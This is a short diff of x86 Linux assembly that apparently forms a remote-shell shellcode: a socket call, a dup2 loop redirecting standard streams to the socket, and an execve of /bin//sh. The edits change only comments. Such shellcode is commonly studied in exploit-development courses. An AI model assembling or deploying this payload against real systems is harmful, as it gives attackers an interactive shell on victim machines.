@@ -54,7 +54,7 @@
     mov    ecx, esp          ; ecx      = &args
     int    0x80
     
-    xchg   eax, ebx          ; ebx      = sockfd
+    xchg   eax, ebx          ; ebx      = s
     
     ; step 2, assign socket to stdin, stdout, stderr
     ; dup2 (s, STDIN_FILENO)
@@ -81,7 +81,7 @@ dup_loop:
     int    0x80
     
     ; step 4, execute /bin/sh
-    ; execv("/bin//sh", 0, 0);    
+    ; execv("/bin//sh", NULL, NULL);    
     mov    al, 0xb           ; eax=sys_execve
     push   edx               ; '\0'
     push   '//sh'	           ; 
